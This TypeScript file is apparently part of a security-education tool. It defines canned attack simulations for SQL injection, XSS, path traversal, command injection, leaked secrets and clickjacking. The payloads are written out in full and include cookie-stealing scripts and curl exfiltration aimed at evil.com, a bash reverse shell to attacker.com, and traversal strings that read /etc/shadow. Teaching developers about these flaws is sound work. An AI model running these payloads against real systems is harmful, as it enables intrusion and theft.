// lib/attack-simulator.ts
// Attack Simulation Engine for CyberSentry AI

export interface AttackSimulation {
  vulnerability: string
  payload: string
  explanation: string
  impact: string
  severity: 'critical' | 'high' | 'medium'
  steps: string[]
  defenseBypass: string
}

export interface SimulationResult {
  success: boolean
  simulation: AttackSimulation | null
  error?: string
}

/* ─────────────────────────────────────────────────
   STATIC SIMULATION LIBRARY
   (Used as fallback or when API is unavailable)
───────────────────────────────────────────────── */
const SIMULATION_LIBRARY: Record<string, AttackSimulation> = {
  'SQL Injection (SQLi)': {
    vulnerability: 'SQL Injection (SQLi)',
    payload: `' OR '1'='1'; --\n\n-- Auth bypass:\nusername: admin'--\npassword: anything\n\n-- Data dump:\n' UNION SELECT table_name,2,3 FROM information_schema.tables--`,
    explanation: `The attacker injects SQL syntax directly into the query string. The single quote (') breaks out of the string literal, the OR '1'='1' makes the condition always true, and the -- comments out the rest of the original query. The database executes this as valid SQL with no way to distinguish it from a legitimate request.`,
    impact: `Full authentication bypass — attacker logs in as any user without a password. Can dump entire database contents (usernames, passwords, private data). Can modify or delete all records. In some configurations, can execute OS commands via xp_cmdshell.`,
    severity: 'critical',
    steps: [
      "Attacker identifies login form or URL parameter that queries a database",
      "Tests with a single quote (') to see if query breaks — error message confirms injection point",
      "Crafts payload: admin'-- to comment out password check",
      "Submits form — database runs: SELECT * FROM users WHERE name='admin'--' AND pass='x'",
      "Comment removes password check, query returns admin row, attacker is authenticated",
      "Escalates to UNION-based attack to extract all table data"
    ],
    defenseBypass: `This bypasses naive input filters that only block keywords like SELECT or DROP but miss the single-quote injection that restructures the query logic.`
  },

  'XSS': {
    vulnerability: 'Cross-Site Scripting (XSS)',
    payload: `<script>document.location='https://evil.com/steal?c='+document.cookie</script>\n\n<!-- Bypass basic filters: -->\n<img src=x onerror="fetch('https://evil.com/?c='+btoa(document.cookie))">\n\n<!-- Stored XSS in profile name: -->\n<svg onload=alert(document.domain)>`,
    explanation: `The attacker injects JavaScript into a page that other users will view. When the victim's browser renders the page, it executes the malicious script in the context of the trusted website — with full access to the victim's cookies, session tokens, and DOM. The victim has no idea anything malicious happened.`,
    impact: `Session hijacking — attacker steals session cookie and takes over account. Keylogging — capture every keystroke including passwords on that page. Phishing redirect — silently redirect user to fake login page. Cryptocurrency mining — use victim's CPU for mining. Defacement — alter page content seen by all users.`,
    severity: 'high',
    steps: [
      "Attacker finds a text input whose value is reflected in the page without escaping",
      "Tests with <script>alert(1)</script> — if an alert pops, the field is vulnerable",
      "Crafts cookie-stealing payload that sends data to attacker's server",
      "Submits payload in a field that gets stored (comment, username, bio)",
      "Every user who views that page executes the attacker's JavaScript",
      "Attacker's server collects cookies — uses them to hijack authenticated sessions"
    ],
    defenseBypass: `Bypasses filters looking for <script> tags by using event handlers (onerror, onload) which achieve the same execution without the script tag.`
  },

  'Path Traversal': {
    vulnerability: 'Path Traversal',
    payload: `../../../etc/passwd\n\n# URL encoded (bypass filters):\n..%2F..%2F..%2Fetc%2Fpasswd\n\n# Double encoded:\n..%252F..%252Fetc%252Fshadow\n\n# Windows target:\n..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts`,
    explanation: `The attacker manipulates a file path parameter by inserting ../ sequences to "walk up" the directory tree beyond the intended restricted folder. The server follows these relative path components and ends up reading files from arbitrary locations on the filesystem — including system files, configuration files with database credentials, and private keys.`,
    impact: `Read /etc/passwd to enumerate all system users. Read /etc/shadow to get hashed passwords for offline cracking. Access application config files with database credentials, API keys, and secrets. On Windows, read SAM database or registry hives. Combined with file write vulnerability, can achieve remote code execution.`,
    severity: 'high',
    steps: [
      "Attacker finds endpoint that reads a file by name: /api/file?name=report.pdf",
      "Tests with ../etc/passwd — if server returns file contents, traversal is possible",
      "If basic ../ is blocked, tries URL-encoded variants: %2F, %252F, ..;/",
      "Walks up directory tree until reaching filesystem root",
      "Reads sensitive files: database configs, private keys, /etc/shadow",
      "Uses credentials found to pivot to database or other services"
    ],
    defenseBypass: `Bypasses simple string replacement of '../' by using URL encoding (%2F) or null bytes to confuse the path resolver while maintaining the traversal effect.`
  },

  'Command Injection': {
    vulnerability: 'Command Injection',
    payload: `; cat /etc/passwd\n\n# List all files:\n&& ls -la /\n\n# Reverse shell:\n; bash -i >& /dev/tcp/attacker.com/4444 0>&1\n\n# Data exfiltration:\n| curl -d @/etc/passwd https://evil.com/collect`,
    explanation: `The attacker appends shell operators (;, &&, |, backticks) to a user input that gets passed to a system shell command. The original command runs first, then the attacker's command runs with the same permissions as the web server process — which is often root or a highly privileged service account.`,
    impact: `Execute arbitrary commands on the server with web server privileges. Read any file accessible to the process (config files, secrets, user data). Establish a persistent reverse shell for continued access. Install backdoors, cryptominers, or ransomware. Pivot to internal network, attack other services. Complete server takeover if process runs as root.`,
    severity: 'critical',
    steps: [
      "Attacker finds a feature that runs a system command with user input (ping, nslookup, image processing)",
      "Tests with: testinput; id — if server returns uid=www-data, injection is confirmed",
      "Crafts reverse shell payload to establish persistent connection",
      "Runs: bash -i >& /dev/tcp/attacker-server.com/4444 0>&1",
      "Attacker's netcat listener receives shell with web server privileges",
      "Enumerates server, reads credentials, escalates privileges to root"
    ],
    defenseBypass: `Bypasses filters that only block known dangerous commands by using output redirection and piping operators that are often overlooked in blocklists.`
  },

  'Hardcoded Secrets Detection': {
    vulnerability: 'Hardcoded Secrets',
    payload: `# Automated scanner finds secrets in git history:\ngit log --all --full-history -- "*.env"\ngit show <commit>:.env\n\n# GitHub dork:\npath:.env DB_PASSWORD\npath:config.js apiKey\n\n# TruffleHog scan:\ntrufflehog git https://github.com/target/repo`,
    explanation: `Secrets committed to source code get stored permanently in git history. Even after deletion, every previous commit contains the secret. Attackers use automated tools to scan public repositories (and leaked private ones) for patterns matching API keys, passwords, and tokens. GitHub's own secret scanning detected 11 million secrets in 2023.`,
    impact: `AWS key → spin up thousands of servers, $50k+ bill in hours, all S3 data exposed. Database password → read/write all customer data. Stripe API key → issue refunds, read payment data, create charges. JWT secret → forge authentication tokens for any user. SMTP credentials → send phishing emails from trusted domain.`,
    severity: 'high',
    steps: [
      "Attacker clones public repository or finds leaked private repo",
      "Runs TruffleHog or GitLeaks to scan entire commit history automatically",
      "Tool finds .env file committed 6 months ago containing AWS_SECRET_KEY",
      "Even though developer deleted it in next commit, it's still in git history",
      "Attacker uses credentials to authenticate to AWS console",
      "Exports all S3 bucket data, deploys cryptominers, reads all databases"
    ],
    defenseBypass: `Bypasses the false sense of security from deleting the secret file — git history is immutable and the secret remains accessible via git show <old-commit>:.env`
  },

  'Missing Security Headers': {
    vulnerability: 'Missing Security Headers',
    payload: `<!-- Clickjacking via missing X-Frame-Options: -->\n<html>\n<body>\n  <iframe src="https://target.com/transfer-money"\n    style="opacity:0;position:absolute;top:0;left:0;width:100%;height:100%">\n  </iframe>\n  <button style="position:absolute;top:200px;left:300px">\n    Click to win prize!\n  </button>\n</body>\n</html>`,
    explanation: `Without X-Frame-Options, the attacker loads the target site in an invisible iframe overlaid on a fake page. The victim thinks they're clicking a harmless button, but they're actually clicking "Confirm Transfer" on the hidden banking page below. Without HSTS, connections can be downgraded from HTTPS to HTTP allowing traffic interception.`,
    impact: `Clickjacking enables: forced likes/follows on social media, unauthorized financial transfers, account setting changes (email, password), one-click malware downloads. HTTPS downgrade enables full traffic interception on public WiFi. Missing CSP allows injected scripts to run freely.`,
    severity: 'high',
    steps: [
      "Attacker confirms target has no X-Frame-Options header via curl -I",
      "Creates malicious page that iframes the target's sensitive action endpoint",
      "Overlays a fake 'Win a Prize' button exactly over the real 'Confirm' button",
      "Shares malicious URL via social engineering (email, social media)",
      "Victim clicks fake button — actually clicks real action in hidden iframe",
      "Target site executes action as the authenticated victim user"
    ],
    defenseBypass: `Works regardless of authentication or CSRF tokens because the victim is genuinely authenticated — the attack hijacks their legitimate session.`
  }
}

/* ─────────────────────────────────────────────────
   MAIN SIMULATE FUNCTION
───────────────────────────────────────────────── */
export async function simulateAttack(
  vulnerabilityName: string,
  codeSnippet: string
): Promise<SimulationResult> {
  // Try to find exact match first
  const exactMatch = SIMULATION_LIBRARY[vulnerabilityName]
  if (exactMatch) {
    return { success: true, simulation: exactMatch }
  }

  // Try partial match
  for (const [key, sim] of Object.entries(SIMULATION_LIBRARY)) {
    if (
      vulnerabilityName.toLowerCase().includes(key.toLowerCase()) ||
      key.toLowerCase().includes(vulnerabilityName.toLowerCase())
    ) {
      return { success: true, simulation: sim }
    }
  }

  // Generic fallback
  return {
    success: true,
    simulation: {
      vulnerability: vulnerabilityName,
      payload: `# Automated payload for ${vulnerabilityName}\n# Contact security team for manual analysis`,
      explanation: `This vulnerability allows attackers to manipulate ${vulnerabilityName.toLowerCase()} in unexpected ways that the developer did not intend.`,
      impact: `Potential data breach, unauthorized access, or system compromise depending on context.`,
      severity: 'high',
      steps: [
        `Identify vulnerable input vector related to ${vulnerabilityName}`,
        `Craft payload to exploit the vulnerability`,
        `Submit to target application`,
        `Observe unexpected behavior or data exposure`
      ],
      defenseBypass: `Context-specific bypass techniques apply.`
    }
  }
}

export function getSimulationLibraryKeys(): string[] {
  return Object.keys(SIMULATION_LIBRARY)
}